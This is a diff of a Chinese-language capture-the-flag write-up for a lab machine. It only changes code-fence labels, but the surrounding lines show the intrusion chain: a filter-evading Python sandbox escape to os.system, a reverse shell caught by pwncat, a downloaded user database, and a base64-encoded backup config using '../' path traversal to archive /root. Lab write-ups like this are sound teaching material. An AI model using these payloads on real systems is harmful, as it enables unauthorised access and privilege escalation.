@@ -16,7 +16,7 @@ Operating System: Linux
 
 ## 资产探测
 
-```shell
+```bash
 Nmap scan report for bogon (10.10.11.62)
 Host is up (0.15s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -105,7 +105,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 由于 `print(os.system())` 不会直接返回命令的执行结果，所以可以尝试通过 curl 和 wget 进行数据传输
 
-```shell
+```bash
 # 服务器
 > func = "".__class__.__base__.__subclasses__()[132].__init__.__globals__["syste"+"m"]
 
@@ -143,7 +143,7 @@ pty.spawn("bash")
 
 即可得到回连的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [20:23:20] Welcome to pwncat 🐈!
@@ -189,14 +189,14 @@ martin           pts/0    10.10.16.17      Wed Mar 26 06:46:27 +0000 2025
 
 发现一个数据库文件
 
-```shell
+```bash
 (remote) app-production@code:/tmp$ file /home/app-production/app/instance/database.db
 /home/app-production/app/instance/database.db: SQLite 3.x database, last written using SQLite version 3031001
 ```
 
 将其下载下来读取
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sqlite3 database.db
 SQLite version 3.46.1 2024-08-13 09:16:08
@@ -219,7 +219,7 @@ sqlite> SELECT * FROM user;
 
 那么就可以得到 martin 用户的权限
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs martin@10.10.11.62
 [20:39:28] Welcome to pwncat 🐈!
@@ -234,7 +234,7 @@ martin
 
 分析当前用户的 sudo 可执行文件
 
-```shell
+```bash
 (remote) martin@code:/home/martin$ sudo -l
 Matching Defaults entries for martin on localhost:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -245,7 +245,7 @@ User martin may run the following commands on localhost:
 
 查看脚本的内容
 
-```shell title="/usr/bin/backy.sh"
+```bash title="/usr/bin/backy.sh"
 #!/bin/bash
 
 if [[$# -ne 1]]; then
@@ -309,7 +309,7 @@ done
 
 转换为 base64 之后准备攻击
 
-```shell
+```bash
 # SSH Session 1
 martin@code:~$ for i in $(seq 100000);do echo ewoJImRlc3RpbmF0aW9uIjogIi9ob21lL21hcnRpbi9CYWNrdXAiLAoJIm11bHRpcHJvY2Vzc2luZyI6IHRydWUsCgkidmVyYm9zZV9sb2ciOiB0cnVlLAoJImRpcmVjdG9yaWVzX3RvX2FyY2hpdmUiOiBbCgkJIi92YXIvLi4vLi4vLi4vLi4vcm9vdC8iCgldCn0= | base64 -d > 1.json ;done
 
